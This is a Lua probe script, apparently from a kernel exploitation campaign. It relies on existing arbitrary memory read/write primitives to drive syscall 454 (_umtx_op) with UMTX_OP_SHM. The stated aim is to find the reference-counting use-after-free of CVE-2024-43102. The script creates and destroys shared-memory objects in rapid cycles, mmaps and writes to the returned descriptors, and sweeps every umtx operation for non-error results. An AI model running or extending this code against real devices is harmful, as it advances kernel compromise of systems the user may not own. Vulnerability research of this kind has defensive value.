-- CRASH_CLASS: MODERATE
-- PROBE 56l: Deep UMTX_OP_SHM exploration on syscall 454
--
-- Context: 56k confirmed UMTX_OP_SHM(25) returns 0 on syscall 454!
-- CVE-2024-43102 was a UAF in umtx shared memory reference counting.
-- We need to understand: does SHM return an fd? Can we create/destroy
-- SHM objects? What sub-operations work? Can we trigger refcount issues?
--
-- UMTX_SHM sub-ops (passed via val argument):
--   UMTX_SHM_CREAT  = 0x0001 (create new SHM)
--   UMTX_SHM_LOOKUP = 0x0002 (lookup existing SHM)
--   UMTX_SHM_DESTROY = 0x0010 (destroy SHM)
--   UMTX_SHM_ALIVE  = 0x0004 (check if SHM is alive)

print("=== PROBE 56l: UMTX_OP_SHM DEEP EXPLORATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)

-- ============================================================
-- SECTION A: Test SHM sub-operations
-- ============================================================
print("")
print("--- A: SHM SUB-OPS ---")

-- _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- For UMTX_OP_SHM (25):
--   obj = key address (used to identify the SHM object)
--   val = sub-operation (CREAT=1, LOOKUP=2, ALIVE=4, DESTROY=0x10)
--   Returns: fd on success for CREAT/LOOKUP

local shm_key = memory.alloc(0x100)
safe_wq(shm_key, uint64(0x12345678))

-- Test CREAT (val=1)
local ok1, ret1 = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
print("SHM CREAT(1): ok=" .. tostring(ok1) .. " ret=" .. tostring(ret1))
local ret1_num = to_num(ret1)
print("  ret as number=" .. ret1_num)
if ret1_num > 0 and ret1_num < 1000 then
    print("  *** Looks like an fd! ***")
end

-- Test with val=0 (the 56k test used val=0)
local ok0, ret0 = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(0), uint64(0), uint64(0))
end)
print("SHM val=0: ok=" .. tostring(ok0) .. " ret=" .. tostring(ret0))

-- Test LOOKUP (val=2)
local ok2, ret2 = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(2), uint64(0), uint64(0))
end)
print("SHM LOOKUP(2): ok=" .. tostring(ok2) .. " ret=" .. tostring(ret2))

-- Test ALIVE (val=4)
local ok4, ret4 = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
print("SHM ALIVE(4): ok=" .. tostring(ok4) .. " ret=" .. tostring(ret4))

-- Test DESTROY (val=0x10)
local ok10, ret10 = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(0x10), uint64(0), uint64(0))
end)
print("SHM DESTROY(0x10): ok=" .. tostring(ok10) .. " ret=" .. tostring(ret10))

-- ============================================================
-- SECTION B: Create multiple SHM objects with different keys
-- ============================================================
print("")
print("--- B: MULTIPLE SHM OBJECTS ---")

local shm_fds = {}
for i = 0, 9 do
    local key = memory.alloc(0x40)
    safe_wq(key, uint64(0xAA000000 + i))

    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    local rn = to_num(ret)
    print(string.format("  SHM[%d] key=0x%X: ok=%s ret=%d", i, 0xAA000000+i, tostring(ok), rn))
    if ok and rn >= 0 then
        shm_fds[#shm_fds + 1] = {fd = rn, key_addr = key, key_val = 0xAA000000 + i}
    end
end

-- ============================================================
-- SECTION C: Check if SHM fds are real file descriptors
-- ============================================================
print("")
print("--- C: SHM FD VALIDATION ---")

-- Try fstat on the returned values to see if they're real fds
local sc_fstat = make_syscall(189)  -- fstat
for _, entry in ipairs(shm_fds) do
    local statbuf = memory.alloc(0x200)
    local ok_f, ret_f = pcall(function()
        return sc_fstat(uint64(entry.fd), uint64(to_num(statbuf)))
    end)
    local rn = to_num(ret_f)
    if ok_f and rn == 0 then
        -- Read some stat fields
        local st_dev = safe_rd(statbuf)
        local st_ino = safe_rd(statbuf + 4)
        local st_mode = safe_rd(statbuf + 8)
        local st_size_lo = safe_rd(statbuf + 0x48)
        local st_size_hi = safe_rd(statbuf + 0x4C)
        print(string.format("  fd=%d: dev=%s ino=%s mode=0x%X size=%d",
            entry.fd, tostring(st_dev), tostring(st_ino),
            st_mode or 0, (st_size_hi or 0) * 0x100000000 + (st_size_lo or 0)))
    else
        print(string.format("  fd=%d: fstat ret=%d (not a real fd?)", entry.fd, rn))
    end
end

-- ============================================================
-- SECTION D: Try mmap on SHM fds
-- ============================================================
print("")
print("--- D: MMAP SHM FDS ---")

local sc_mmap = make_syscall(477)
for _, entry in ipairs(shm_fds) do
    if entry.fd >= 0 and entry.fd < 1000 then
        -- Try to mmap the SHM fd
        local ok_m, ret_m = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3), -- PROT_READ|PROT_WRITE
                uint64(1), -- MAP_SHARED
                uint64(entry.fd), uint64(0))
        end)
        local h, l = get_hi_lo(ret_m)
        print(string.format("  fd=%d mmap: ok=%s addr=%s",
            entry.fd, tostring(ok_m), fmt_addr(ret_m)))

        -- If mmap succeeded, try to read from the mapped area
        if ok_m and h ~= 0xFFFFFFFF then
            local ok_rb, data = pcall(function()
                return native.read_buffer(ret_m, 64)
            end)
            if ok_rb and data then
                local hex = {}
                for j = 1, math.min(#data, 32) do
                    hex[#hex + 1] = string.format("%02X", data:byte(j))
                end
                print("    data: " .. table.concat(hex, " "))
            end
        end
    end
end

-- ============================================================
-- SECTION E: SHM create/destroy cycle - look for refcount issues
-- ============================================================
print("")
print("--- E: CREATE/DESTROY CYCLE ---")

-- Create and immediately destroy SHM objects in rapid succession
-- Even without threads, if there's a refcount bug in the single-threaded path...
local cycle_key = memory.alloc(0x40)
for i = 0, 19 do
    safe_wq(cycle_key, uint64(0xBB000000 + i))

    -- Create
    local ok_c, ret_c = pcall(function()
        return sc_umtx(uint64(to_num(cycle_key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    local fd_c = to_num(ret_c)

    -- Destroy
    local ok_d, ret_d = pcall(function()
        return sc_umtx(uint64(to_num(cycle_key)), uint64(25), uint64(0x10), uint64(0), uint64(0))
    end)

    -- Check alive after destroy
    local ok_a, ret_a = pcall(function()
        return sc_umtx(uint64(to_num(cycle_key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    if i < 5 or i == 19 then
        print(string.format("  cycle[%d]: create_fd=%d destroy=%s alive=%s",
            i, fd_c, tostring(to_num(ret_d)), tostring(to_num(ret_a))))
    end
end

-- ============================================================
-- SECTION F: Other UMTX ops that might work
-- ============================================================
print("")
print("--- F: OTHER UMTX OPS ---")

-- Test all ops 0-31 to see which ones work
local umtx_obj = memory.alloc(0x100)
safe_wq(umtx_obj, uint64(0))

for op = 0, 31 do
    if op ~= 5 and op ~= 6 and op ~= 25 and op ~= 26 then
        local ok_op, ret_op = pcall(function()
            return sc_umtx(uint64(to_num(umtx_obj)), uint64(op), uint64(0), uint64(0), uint64(0))
        end)
        local rn = to_num(ret_op)
        if ok_op and rn ~= -1 then
            print(string.format("  op=%d: ok=%s ret=%d *** NON-NEGATIVE ***", op, tostring(ok_op), rn))
        elseif not ok_op then
            print(string.format("  op=%d: PCALL_FAIL", op))
        end
    end
end

-- Also specifically test ops that are interesting:
-- UMTX_OP_MUTEX_WAIT = 17
-- UMTX_OP_MUTEX_WAKE = 18
-- UMTX_OP_MUTEX_WAKE2 = 20
-- UMTX_OP_SEM2_WAIT = 23
-- UMTX_OP_SEM2_WAKE = 24
local interesting_ops = {
    {op=17, name="MUTEX_WAIT"},
    {op=18, name="MUTEX_WAKE"},
    {op=20, name="MUTEX_WAKE2"},
    {op=23, name="SEM2_WAIT"},
    {op=24, name="SEM2_WAKE"},
}
print("")
print("  Interesting ops detail:")
for _, entry in ipairs(interesting_ops) do
    local ok_i, ret_i = pcall(function()
        return sc_umtx(uint64(to_num(umtx_obj)), uint64(entry.op), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  %s(%d): ok=%s ret=%s", entry.name, entry.op, tostring(ok_i), tostring(ret_i)))
end

-- ============================================================
-- SECTION G: Try to read kernel data via SHM fd
-- ============================================================
print("")
print("--- G: SHM KERNEL DATA CHECK ---")

-- If we got an fd from SHM, try reading from it with read(2)
local sc_read = make_syscall(3)  -- read
local sc_write = make_syscall(4)  -- write
if #shm_fds > 0 then
    local fd = shm_fds[1].fd
    local rbuf = memory.alloc(0x100)

    -- Try read
    local ok_r, ret_r = pcall(function()
        return sc_read(uint64(fd), uint64(to_num(rbuf)), uint64(64))
    end)
    print("read(shm_fd=" .. fd .. ", 64): ok=" .. tostring(ok_r) .. " ret=" .. tostring(ret_r))

    -- Try write
    local wbuf = memory.alloc(0x100)
    for i = 0, 7 do safe_wd(wbuf + i*4, 0x41414141 + i) end
    local ok_w, ret_w = pcall(function()
        return sc_write(uint64(fd), uint64(to_num(wbuf)), uint64(32))
    end)
    print("write(shm_fd=" .. fd .. ", 32): ok=" .. tostring(ok_w) .. " ret=" .. tostring(ret_w))
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56l COMPLETE ===")
